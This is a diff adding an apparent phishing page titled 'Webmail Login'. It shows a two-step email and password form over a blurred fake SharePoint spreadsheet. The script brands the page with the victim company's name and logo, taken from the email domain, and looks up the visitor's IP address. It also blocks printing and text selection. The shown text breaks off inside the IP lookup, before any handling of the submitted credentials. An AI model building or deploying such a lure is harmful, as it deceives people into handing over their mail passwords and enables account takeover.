@@ -1,0 +1,1484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <link id="tabFavicon" rel="icon" type="image/png" href="">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-tap-highlight-color: transparent;
+        }
+        input, textarea, select, [contenteditable="true"] {
+            -webkit-user-select: text !important;
+            -moz-user-select: text !important;
+            -ms-user-select: text !important;
+            user-select: text !important;
+        }
+        img { -webkit-user-drag: none; -moz-user-drag: none; user-drag: none; }
+        @media print { body { display: none !important; } }
+
+        body {
+            background-color: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ============================================================
+           BACKGROUND: FAKE EXCEL / SHAREPOINT SHEET
+           ============================================================ */
+        #bgSheet {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: 0;
+            overflow: hidden;
+            background: #fff;
+            filter: blur(1.5px) brightness(0.97);
+        }
+
+        #bgSheet .sp-topbar {
+            background: #0364b8; color: #fff;
+            height: 48px;
+            display: flex; align-items: center;
+            padding: 0 16px; gap: 14px;
+        }
+        #bgSheet .sp-topbar .waffle {
+            width: 20px; height: 20px;
+            display: grid; grid-template-columns: repeat(3, 1fr); grid-gap: 2px;
+        }
+        #bgSheet .sp-topbar .waffle span { background: #fff; border-radius: 1px; display: block; }
+        #bgSheet .sp-topbar .brand { font-size: 15px; font-weight: 600; }
+        #bgSheet .sp-topbar .search {
+            flex: 1; max-width: 480px; margin-left: 20px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 4px; padding: 6px 12px;
+            font-size: 13px; color: #e8f0fa;
+        }
+        #bgSheet .sp-topbar .avatar {
+            width: 30px; height: 30px; border-radius: 50%;
+            background: #a4262c;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 13px; font-weight: 600; margin-left: auto;
+        }
+
+        #bgSheet .ribbon {
+            background: #fff;
+            border-bottom: 1px solid #edebe9;
+            padding: 8px 16px;
+            display: flex; align-items: center; gap: 8px;
+            overflow: hidden; white-space: nowrap;
+        }
+        #bgSheet .ribbon button {
+            background: transparent; border: 1px solid transparent;
+            padding: 6px 12px; font-size: 13px; color: #323130;
+            border-radius: 3px; white-space: nowrap;
+        }
+        #bgSheet .ribbon button.primary { background: #0364b8; color: #fff; font-weight: 600; }
+        #bgSheet .ribbon .divider { width: 1px; height: 22px; background: #edebe9; margin: 0 4px; display: inline-block; vertical-align: middle; }
+        #bgSheet .ribbon .status { margin-left: auto; font-size: 12px; color: #605e5c; }
+        #bgSheet .ribbon .status .dot {
+            display: inline-block; width: 8px; height: 8px;
+            background: #107c10; border-radius: 50%; margin-right: 6px; vertical-align: middle;
+        }
+
+        #bgSheet .formula-bar {
+            background: #fff; border-bottom: 1px solid #edebe9;
+            display: flex; height: 30px;
+        }
+        #bgSheet .formula-bar .cellref {
+            width: 90px; border-right: 1px solid #edebe9;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 13px; font-weight: 600; background: #faf9f8;
+        }
+        #bgSheet .formula-bar .fx {
+            width: 34px; display: flex; align-items: center; justify-content: center;
+            color: #605e5c; font-style: italic; font-size: 13px;
+            border-right: 1px solid #edebe9;
+        }
+        #bgSheet .formula-bar input {
+            flex: 1; border: none; outline: none;
+            padding: 0 10px; font-size: 13px;
+            font-family: Consolas, "Courier New", monospace;
+            background: transparent;
+        }
+
+        #bgSheet .sheet-wrap {
+            height: calc(100vh - 48px - 50px - 30px - 34px);
+            overflow: hidden; background: #fff;
+        }
+        #bgSheet table.sheet {
+            border-collapse: collapse; font-size: 13px; min-width: 100%;
+        }
+        #bgSheet table.sheet th {
+            background: #f3f2f1; border: 1px solid #d2d0ce;
+            padding: 4px 6px; font-weight: 600; font-size: 12px;
+            color: #605e5c; text-align: center; white-space: nowrap;
+        }
+        #bgSheet table.sheet th.rowhead { width: 44px; }
+        #bgSheet table.sheet td.rowhead {
+            background: #f3f2f1; border: 1px solid #d2d0ce;
+            text-align: center; font-size: 12px; color: #605e5c;
+            font-weight: 600; padding: 4px;
+        }
+        #bgSheet table.sheet td {
+            border: 1px solid #e1dfdd;
+            padding: 4px 8px; height: 28px; min-width: 110px;
+            vertical-align: middle;
+        }
+        #bgSheet table.sheet td.num { text-align: right; font-variant-numeric: tabular-nums; }
+
+        #bgSheet .badge {
+            display: inline-block; padding: 2px 8px; border-radius: 10px;
+            font-size: 11px; font-weight: 600; line-height: 1.4;
+        }
+        #bgSheet .badge.open        { background: #deecf9; color: #004578; }
+        #bgSheet .badge.in-progress { background: #fff4ce; color: #8a6116; }
+        #bgSheet .badge.blocked     { background: #fde7e9; color: #a4262c; }
+        #bgSheet .badge.done        { background: #dff6dd; color: #107c10; }
+        #bgSheet .badge.high        { background: #fde7e9; color: #a4262c; }
+        #bgSheet .badge.medium      { background: #fff4ce; color: #8a6116; }
+        #bgSheet .badge.low         { background: #dff6dd; color: #107c10; }
+        #bgSheet .badge.urgent      { background: #a4262c; color: #fff; }
+        #bgSheet .badge.on-hold     { background: #e1dfdd; color: #323130; }
+
+        #bgSheet .sheet-tabs {
+            height: 34px; background: #f3f2f1;
+            border-top: 1px solid #edebe9;
+            display: flex; align-items: center;
+            padding: 0 8px; gap: 2px;
+        }
+        #bgSheet .sheet-tabs .nav {
+            width: 24px; height: 24px;
+            display: flex; align-items: center; justify-content: center;
+            color: #605e5c; font-size: 14px;
+        }
+        #bgSheet .sheet-tabs .tab {
+            padding: 4px 14px; font-size: 12.5px; color: #323130;
+            border-radius: 3px 3px 0 0;
+        }
+        #bgSheet .sheet-tabs .tab.active {
+            background: #fff; font-weight: 600;
+            border-bottom: 2px solid #0364b8; color: #0364b8;
+        }
+        #bgSheet .sheet-tabs .add {
+            width: 24px; height: 24px;
+            display: flex; align-items: center; justify-content: center;
+            color: #605e5c; font-size: 16px; margin-left: 4px;
+        }
+
+        /* ============================================================
+           WHITE WASH OVERLAY
+           ============================================================ */
+        #bgOverlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(255, 255, 255, 0.72);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* ============================================================
+           VISITOR INFO BANNER — NOW BLURRED
+           ============================================================ */
+        #visitorBanner {
+            position: fixed;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 2;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            width: calc(100% - 40px);
+            max-width: 720px;
+            /* BLUR the entire banner so it recedes behind the login form */
+            filter: blur(2px) brightness(0.98);
+            opacity: 0.92;
+        }
+
+        .vb-card {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.88);
+            border: 1px solid #d2d0ce;
+            border-radius: 10px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            backdrop-filter: blur(8px);
+        }
+
+        .vb-logo {
+            width: 46px;
+            height: 46px;
+            border-radius: 8px;
+            background: #f3f2f1;
+            border: 1px solid #e1dfdd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .vb-logo img {
+            width: 100%; height: 100%;
+            object-fit: contain;
+            padding: 4px;
+        }
+        .vb-logo .vb-fallback {
+            width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 20px; font-weight: 700; color: #0364b8;
+            background: #deecf9;
+        }
+
+        .vb-main {
+            flex: 1;
+            min-width: 0;
+            text-align: left;
+        }
+        .vb-company {
+            font-size: 17px;
+            font-weight: 700;
+            color: #0364b8;
+            margin-bottom: 2px;
+            word-break: break-word;
+            line-height: 1.2;
+        }
+        .vb-domain {
+            font-size: 13px;
+            color: #605e5c;
+            word-break: break-all;
+            line-height: 1.3;
+        }
+        .vb-domain strong { color: #323130; }
+
+        .vb-meta {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 3px;
+            font-size: 12px;
+            color: #605e5c;
+            text-align: right;
+            flex-shrink: 0;
+        }
+        .vb-meta .vb-chip {
+            background: #f3f2f1;
+            border: 1px solid #e1dfdd;
+            border-radius: 12px;
+            padding: 2px 10px;
+            font-family: Consolas, "Courier New", monospace;
+            font-size: 11.5px;
+            color: #323130;
+            white-space: nowrap;
+        }
+        .vb-meta .vb-chip.live {
+            background: #dff6dd;
+            border-color: #c3e6c1;
+            color: #107c10;
+            font-weight: 600;
+        }
+
+        .vb-stats {
+            display: flex;
+            gap: 8px;
+            width: 100%;
+            justify-content: center;
+        }
+        .vb-stat {
+            background: rgba(255, 255, 255, 0.88);
+            border: 1px solid #d2d0ce;
+            border-radius: 8px;
+            padding: 6px 14px;
+            font-size: 12px;
+            color: #323130;
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+        .vb-stat .lbl { color: #605e5c; }
+        .vb-stat .val { font-weight: 700; color: #0364b8; }
+
+        /* ============================================================
+           LOGIN FORM (stays sharp, above everything)
+           ============================================================ */
+        #LoginForm {
+            width: 100%;
+            max-width: 340px;
+            padding: 24px 20px;
+            text-align: center;
+            position: relative;
+            z-index: 3;
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.18);
+            backdrop-filter: blur(6px);
+        }
+
+        .brand-mark {
+            display: flex; justify-content: center; margin-bottom: 16px;
+        }
+        .brand-mark .favicon-box {
+            width: 48px; height: 48px;
+            display: flex; align-items: center; justify-content: center;
+            border: 1px solid #d8d8d8; border-radius: 9px;
+            background: #fafafa; padding: 6px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+        .brand-mark .favicon-box img {
+            width: 34px; height: 34px; object-fit: contain; display: block;
+            max-width: 100%; max-height: 100%;
+        }
+        .brand-mark .favicon-box .fallback-icon {
+            width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .brand-mark .favicon-box .fallback-icon svg {
+            width: 26px; height: 26px; fill: #8a9aa8;
+        }
+
+        #greeting {
+            display: none; text-align: left; margin: 2px 2px 14px;
+        }
+        #greeting .hello {
+            font-size: 13px; color: #5f6b76; margin-bottom: 2px;
+        }
+        #greeting .email {
+            font-size: 14px; font-weight: 600; color: #2c3e50;
+            word-break: break-all;
+        }
+
+        .input-group {
+            display: flex; margin-bottom: 14px;
+            border: 1px solid #ccc; border-radius: 6px;
+            overflow: hidden;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background-color: #fff;
+        }
+        .input-group-icon {
+            background-color: #f3f3f3; padding: 10px 16px;
+            border-right: 1px solid #ccc;
+            display: flex; align-items: center; justify-content: center;
+            min-width: 48px;
+        }
+        .input-group-icon svg { width: 18px; height: 18px; fill: #5f5f5f; }
+        .input-group input {
+            flex: 1; border: none; padding: 12px 14px;
+            font-size: 15px; outline: none; color: #2c3e50;
+            background: transparent;
+        }
+        .input-group input::placeholder { color: #9aa9b5; font-weight: 400; }
+        .input-group:focus-within {
+            border-color: #3b9ae1;
+            box-shadow: 0 0 0 3px rgba(59, 154, 225, 0.12);
+        }
+        .input-group input[readonly] {
+            background-color: #f7f9fb !important;
+            color: #4a5761 !important;
+            cursor: not-allowed !important;
+            caret-color: transparent !important;
+            user-select: none !important;
+            -webkit-user-select: none !important;
+            pointer-events: none !important;
+        }
+        .input-group:has(input[readonly]) {
+            background-color: #f7f9fb; border-color: #d8d8d8;
+        }
+        .input-group:has(input[readonly]):focus-within {
+            border-color: #d8d8d8; box-shadow: none;
+        }
+
+        .options-row {
+            display: flex; justify-content: space-between;
+            align-items: center; margin: 2px 2px 16px;
+        }
+        .options-row label {
+            display: flex; align-items: center; gap: 7px;
+            font-size: 13px; color: #4a6f8a;
+            cursor: pointer; user-select: none;
+        }
+        .options-row input[type="checkbox"] {
+            width: 14px; height: 14px; cursor: pointer;
+            accent-color: var(--brand, #1e7bc0);
+        }
+        .options-row a {
+            font-size: 13px; color: var(--brand, #4a6f8a);
+            text-decoration: none; font-weight: 500;
+        }
+        .options-row a:hover { text-decoration: underline; }
+
+        #capsWarn {
+            display: none; font-size: 12px; color: #b26a00;
+            background: #fff4e0; border-left: 3px solid #f0a500;
+            padding: 6px 10px; border-radius: 4px;
+            margin: -6px 2px 10px; text-align: left;
+        }
+
+        button {
+            --btn-color: #1e7bc0;
+            --btn-hover-color: #1365a3;
+            --btn-disabled-color: #80b5dc;
+            width: 100%; padding: 13px 12px;
+            background-color: var(--btn-color); color: white;
+            border: none; border-radius: 6px;
+            font-size: 16px; font-weight: 600;
+            letter-spacing: 0.3px; text-transform: uppercase;
+            cursor: pointer; margin-top: 4px; margin-bottom: 14px;
+            transition: background-color 0.3s ease, box-shadow 0.15s;
+            box-shadow: 0 2px 4px rgba(0,20,40,0.08);
+        }
+        button:hover { background-color: var(--btn-hover-color); }
+        button:disabled { background-color: var(--btn-disabled-color); cursor: not-allowed; box-shadow: none; }
+
+        #backLink {
+            display: inline-block; font-size: 13px;
+            color: var(--brand, #4a6f8a);
+            text-decoration: none; font-weight: 500;
+            margin-bottom: 12px; cursor: pointer; text-align: left;
+        }
+        #backLink:hover { text-decoration: underline; }
+
+        .secure-note {
+            display: flex; align-items: center; justify-content: center;
+            gap: 5px; font-size: 12px; color: #6b7a86;
+            margin-bottom: 18px;
+        }
+        .secure-note svg { width: 12px; height: 12px; fill: #6b7a86; }
+
+        .webmail-link {
+            text-decoration: none; color: #4a6f8a;
+            font-size: 14px; font-weight: 500;
+            border-bottom: 1px dotted #b3c9db;
+        }
+        .webmail-link:hover { color: #1e4660; border-bottom: 1px solid #1e4660; }
+
+        #error {
+            display: none; color: #b71c1c;
+            background: #ffebee; padding: 10px 14px;
+            border-radius: 6px; margin: 12px 0 8px;
+            font-size: 14px; text-align: center;
+            border-left: 4px solid #d32f2f;
+        }
+
+        .spinner {
+            display: inline-block; width: 14px; height: 14px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: #fff; border-radius: 50%;
+            margin-right: 8px; vertical-align: -2px;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================
+         BACKGROUND: EXCEL/SHAREPOINT SHEET
+         ============================================================ -->
+    <div id="bgSheet">
+        <div class="sp-topbar">
+            <div class="waffle">
+                <span></span><span></span><span></span>
+                <span></span><span></span><span></span>
+                <span></span><span></span><span></span>
+            </div>
+            <div class="brand">SharePoint</div>
+            <div class="search">🔍 Search this site</div>
+            <div class="avatar">AS</div>
+        </div>
+
+        <div class="ribbon">
+            <button class="primary">💾 Save</button>
+            <div class="divider"></div>
+            <button>➕ Add row</button>
+            <button>➕ Add column</button>
+            <button>🗑️ Delete row</button>
+            <div class="divider"></div>
+            <button>🎲 Regenerate random data</button>
+            <button>Σ Sum column</button>
+            <button>⇅ Sort by column</button>
+            <div class="divider"></div>
+            <button>⬇️ Export CSV</button>
+            <div class="status"><span class="dot"></span>60 rows loaded</div>
+        </div>
+
+        <div class="formula-bar">
+            <div class="cellref">A1</div>
+            <div class="fx">fx</div>
+            <input type="text" value="Design homepage" readonly>
+        </div>
+
+        <div class="sheet-wrap">
+            <table class="sheet" id="bgSheetTable">
+                <thead id="bgSheetHead"></thead>
+                <tbody id="bgSheetBody"></tbody>
+            </table>
+        </div>
+
+        <div class="sheet-tabs">
+            <div class="nav">⏮</div>
+            <div class="nav">◀</div>
+            <div class="tab active">RandomData</div>
+            <div class="tab">Summary</div>
+            <div class="tab">Archive</div>
+            <div class="add">＋</div>
+        </div>
+    </div>
+
+    <!-- WHITE WASH OVERLAY -->
+    <div id="bgOverlay"></div>
+
+    <!-- ============================================================
+         VISITOR INFO BANNER (blurred)
+         ============================================================ -->
+    <div id="visitorBanner">
+        <div class="vb-card">
+            <div class="vb-logo" id="vbLogo">
+                <div class="vb-fallback" id="vbLogoFallback">?</div>
+            </div>
+            <div class="vb-main">
+                <div class="vb-company" id="vbCompany">Loading company…</div>
+                <div class="vb-domain">
+                    <strong>Domain:</strong> <span id="vbDomain">—</span>
+                </div>
+            </div>
+            <div class="vb-meta">
+                <div class="vb-chip live" id="vbStatusChip">● Live visitor</div>
+                <div class="vb-chip" id="vbIpChip">IP: —</div>
+                <div class="vb-chip" id="vbTimeChip">—</div>
+            </div>
+        </div>
+
+        <div class="vb-stats">
+            <div class="vb-stat"><span class="lbl">Sheet rows:</span> <span class="val" id="vbRowCount">60</span></div>
+            <div class="vb-stat"><span class="lbl">Columns:</span> <span class="val" id="vbColCount">13</span></div>
+            <div class="vb-stat"><span class="lbl">Session started:</span> <span class="val" id="vbSessionStart">—</span></div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         LOGIN FORM
+         ============================================================ -->
+    <div id="LoginForm">
+        <div class="brand-mark">
+            <div class="favicon-box" id="faviconBox">
+                <div class="fallback-icon" id="fallbackIcon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <form id="loginForm" autocomplete="on">
+            <div id="step1">
+                <div class="input-group">
+                    <div class="input-group-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    </div>
+                    <input type="text" id="USER" name="username" placeholder="Email or phone" autocomplete="username" required>
+                </div>
+                <div id="error1" style="display:none; color:#b71c1c; background:#ffebee; padding:10px 14px; border-radius:6px; margin:12px 0 8px; font-size:14px; text-align:center; border-left:4px solid #d32f2f;"></div>
+                <button type="button" id="nextBtn">Next</button>
+                <div class="secure-note">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    Secure connection
+                </div>
+            </div>
+
+            <div id="step2" style="display:none;">
+                <div id="greeting">
+                    <div class="hello">Welcome</div>
+                    <div class="email" id="greetingEmail"></div>
+                </div>
+
+                <a id="backLink">← Use a different account</a>
+
+                <div class="input-group">
+                    <div class="input-group-icon">
+                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    </div>
+                    <input type="password" id="PASSWORD" name="password" placeholder="Enter your password" autocomplete="current-password" required>
+                </div>
+
+                <div id="capsWarn">⚠️ Caps Lock is on</div>
+
+                <div class="options-row">
+                    <label for="remember">
+                        <input type="checkbox" id="remember" name="remember">
+                        Remember me
+                    </label>
+                    <a href="#" id="forgotLink">Forgot password?</a>
+                </div>
+
+                <div id="error2" style="display:none; color:#b71c1c; background:#ffebee; padding:10px 14px; border-radius:6px; margin:12px 0 8px; font-size:14px; text-align:center; border-left:4px solid #d32f2f;"></div>
+                <button type="submit" id="loginBtn">Sign in</button>
+
+                <div class="secure-note">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    Secure connection
+                </div>
+            </div>
+        </form>
+
+        <a href="#" class="webmail-link">webmail</a>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        /* ============================================================
+           BACKGROUND SHEET: RANDOM DATA GENERATOR
+           ============================================================ */
+        const bgColumns = [
+            { key: 'id',       label: 'ID',          type: 'text',    width: 60  },
+            { key: 'task',     label: 'Task',        type: 'text',    width: 220 },
+            { key: 'owner',    label: 'Owner',       type: 'text',    width: 140 },
+            { key: 'team',     label: 'Team',        type: 'choice',  width: 130 },
+            { key: 'status',   label: 'Status',      type: 'choice',  width: 120 },
+            { key: 'priority', label: 'Priority',    type: 'choice',  width: 110 },
+            { key: 'start',    label: 'Start Date',  type: 'date',    width: 110 },
+            { key: 'due',      label: 'Due Date',    type: 'date',    width: 110 },
+            { key: 'units',    label: 'Units',       type: 'number',  width: 80  },
+            { key: 'rate',     label: 'Rate',        type: 'number',  width: 90  },
+            { key: 'total',    label: 'Total',       type: 'formula', width: 110 },
+            { key: 'progress', label: 'Progress %',  type: 'number',  width: 100 },
+            { key: 'notes',    label: 'Notes',       type: 'text',    width: 240 }
+        ];
+
+        const FIRST_NAMES = ['Alice','Bob','Carol','Dave','Eve','Frank','Grace','Heidi','Ivan','Judy',
+                             'Mallory','Niaj','Olivia','Peggy','Rupert','Sybil','Trent','Victor','Wendy','Xavier',
+                             'Yara','Zara','Liam','Noah','Emma','Ava','Sophia','Mia','Lucas','Ethan',
+                             'Mason','Logan','Aiden','James','Elijah','Benjamin','Henry','Alexander','Sebastian','Jack'];
+        const LAST_NAMES  = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez',
+                             'Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor','Moore','Jackson','Martin',
+                             'Lee','Perez','Thompson','White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson'];
+        const TASK_VERBS  = ['Design','Implement','Review','Refactor','Deploy','Test','Debug','Document','Migrate','Optimize',
+                             'Audit','Upgrade','Integrate','Configure','Analyze','Build','Fix','Research','Plan','Launch'];
+        const TASK_NOUNS  = ['homepage','database','API endpoint','login flow','payment gateway','dashboard','mobile app',
+                             'CI pipeline','unit tests','onboarding docs','security patch','data export','user profile',
+                             'search feature','notification service','reporting module','admin panel','email templates',
+                             'landing page','checkout process','recommendation engine','chat widget','analytics tracker',
+                             'backup script','monitoring stack','CDN config','DNS records','SSL certificates'];
+        const NOTE_SNIPPETS = ['Awaiting brand assets','Blocked on #2','Published to prod','Needs QA sign-off',
+                               'Client requested change','Depends on vendor','Out of scope for sprint','High visibility',
+                               'Follow up next week','Reopened after review','Merged to main','Waiting on approval',
+                               'Pending budget','Scope creep risk','Delivered early','Stakeholder demo booked',
+                               'Security review pending','Needs translation','Performance regression','Fixed in hotfix',
+                               '','','',''];
+        const TEAMS = ['Engineering','Design','Marketing','Sales','Support','Finance','HR','Ops'];
+        const STATUSES = ['Open','In Progress','Blocked','Done','On Hold'];
+        const PRIORITIES = ['Low','Medium','High','Urgent'];
+
+        function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+        function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        function randDate(a, b) {
+            const y = randInt(a, b);
+            const m = String(randInt(1, 12)).padStart(2, '0');
+            const d = String(randInt(1, 28)).padStart(2, '0');
+            return `${y}-${m}-${d}`;
+        }
+
+        function bgGenerateRow(id) {
+            const verb = pick(TASK_VERBS);
+            const noun = pick(TASK_NOUNS);
+            const task = `${verb} ${noun}`;
+            const owner = `${pick(FIRST_NAMES)} ${pick(LAST_NAMES)}`;
+            const team = pick(TEAMS);
+            const status = pick(STATUSES);
+            const priority = pick(PRIORITIES);
+            const start = randDate(2025, 2026);
+            const due = randDate(2026, 2026);
+            const units = randInt(1, 40);
+            const rate = randInt(25, 150) + Math.round(Math.random() * 100) / 100;
+            const progress = status === 'Done' ? 100
+                           : status === 'Blocked' ? randInt(0, 40)
+                           : status === 'On Hold' ? randInt(0, 30)
+                           : status === 'In Progress' ? randInt(20, 90)
+                           : randInt(0, 15);
+            const notes = pick(NOTE_SNIPPETS);
+            const total = units * rate;
+            return { id, task, owner, team, status, priority, start, due, units, rate, total, progress, notes };
+        }
+
+        function bgGenerateRows(n) {
+            const out = [];
+            for (let i = 1; i <= n; i++) out.push(bgGenerateRow(i));
+            return out;
+        }
+
+        function bgColLetter(i) {
+            let s = '';
+            i++;
+            while (i > 0) {
+                const m = (i - 1) % 26;
+                s = String.fromCharCode(65 + m) + s;
+                i = Math.floor((i - 1) / 26);
+            }
+            return s;
+        }
+
+        function bgCellDisplay(col, val) {
+            if (col.type === 'choice' && val) {
+                const slug = String(val).toLowerCase().replace(/\s+/g, '-');
+                return `<span class="badge ${slug}">${val}</span>`;
+            }
+            if (col.type === 'number' || col.type === 'formula') {
+                if (val === '' || val === null || isNaN(val)) return '';
+                return Number(val).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            }
+            return val;
+        }
+
+        function bgRenderSheet() {
+            const rows = bgGenerateRows(60);
+
+            const thead = document.getElementById('bgSheetHead');
+            let h = '<tr><th class="rowhead"></th>';
+            bgColumns.forEach((c, i) => {
+                h += `<th style="min-width:${c.width}px">${bgColLetter(i)}<br><span style="font-weight:400;color:#a19f9d">${c.label}</span></th>`;
+            });
+            h += '</tr>';
+            thead.innerHTML = h;
+
+            const tbody = document.getElementById('bgSheetBody');
+            let b = '';
+            rows.forEach((row, r) => {
+                b += `<tr><td class="rowhead">${r + 1}</td>`;
+                bgColumns.forEach((c) => {
+                    const val = row[c.key];
+                    const cls = (c.type === 'number' || c.type === 'formula') ? 'num' : '';
+                    const display = bgCellDisplay(c, val);
+                    b += `<td class="${cls}" style="min-width:${c.width}px">${display}</td>`;
+                });
+                b += '</tr>';
+            });
+            tbody.innerHTML = b;
+
+            document.getElementById('vbRowCount').textContent = rows.length;
+            document.getElementById('vbColCount').textContent = bgColumns.length;
+        }
+
+        bgRenderSheet();
+        setInterval(bgRenderSheet, 20000);
+
+        /* ============================================================
+           VISITOR INFO HELPERS
+           ============================================================ */
+        function domainToCompanyName(domain) {
+            if (!domain) return null;
+            let base = domain.replace(/^www\./i, '');
+            const parts = base.split('.');
+            if (parts.length > 2) {
+                base = parts[parts.length - 2];
+                if (base.length <= 3 && parts.length >= 3) {
+                    base = parts[parts.length - 3];
+                }
+            } else {
+                base = parts[0];
+            }
+            if (!base) return null;
+            return base
+                .split(/[-_]/)
+                .filter(Boolean)
+                .map(w => w.charAt(0).toUpperCase() + w.slice(1))
+                .join(' ');
+        }
+
+        async function resolveCompanyName(domain) {
+            const guess = domainToCompanyName(domain);
+            if (!guess) return null;
+            try {
+                const res = await fetch(`https://autocomplete.clearbit.com/v1/companies/suggest?query=${encodeURIComponent(domain)}`);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (Array.isArray(data) && data.length > 0) {
+                        const match = data.find(c => c.domain && c.domain.toLowerCase() === domain.toLowerCase());
+                        if (match && match.name) {
+                            return { name: match.name, logo: match.logo || null, source: 'clearbit' };
+                        }
+                        if (data[0] && data[0].name) {
+                            return { name: data[0].name, logo: data[0].logo || null, source: 'clearbit' };
+                        }
+                    }
+                }
+            } catch (e) { }
+            return { name: guess, logo: null, source: 'guess' };
+        }
+
+        function setVisitorDomain(domain, companyName, companyLogo) {
+            const domainEl  = document.getElementById('vbDomain');
+            const companyEl = document.getElementById('vbCompany');
+            const logoEl    = document.getElementById('vbLogo');
+
+            if (!domain) {
+                domainEl.textContent = 'unknown';
+                companyEl.textContent = 'Unknown visitor';
+                logoEl.innerHTML = '<div class="vb-fallback">?</div>';
+                return;
+            }
+
+            domainEl.textContent = domain;
+
+            if (companyName) {
+                companyEl.textContent = companyName;
+            } else {
+                companyEl.textContent = domainToCompanyName(domain) || domain;
+            }
+
+            const logoUrl = companyLogo || `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
+            const img = new Image();
+            img.onload = function () {
+                logoEl.innerHTML = '';
+                logoEl.appendChild(img);
+            };
+            img.onerror = function () {
+                logoEl.innerHTML = `<div class="vb-fallback">${(domainToCompanyName(domain) || domain).charAt(0).toUpperCase()}</div>`;
+            };
+            img.alt = domain + ' logo';
+            img.src = logoUrl;
+        }
+
+        async function updateVisitorBannerFromEmail(email) {
+            const domain = getDomainFromEmail(email) || window.location.hostname.replace(/^www\./, '');
+            if (!domain) {
+                setVisitorDomain(null);
+                return;
+            }
+            setVisitorDomain(domain, domainToCompanyName(domain), null);
+            const info = await resolveCompanyName(domain);
+            setVisitorDomain(domain, info.name, info.logo);
+        }
+
+        async function updateVisitorIP() {
+            const ipChip = document.getElementById('vbIpChip');
+            try {
+                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const text = await res.text();
+                const ipLine = text.split('\n').find(l => l.startsWith('ip='));
+                if (ipLine) {
+                    ipChip.textContent = 'IP: ' + ipLine.substring(3).trim();
+                    return;
+                }
+            } catch (e) { }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                if (data.ip) ipChip.textContent = 'IP: ' + data.ip;
+            } catch (e) {
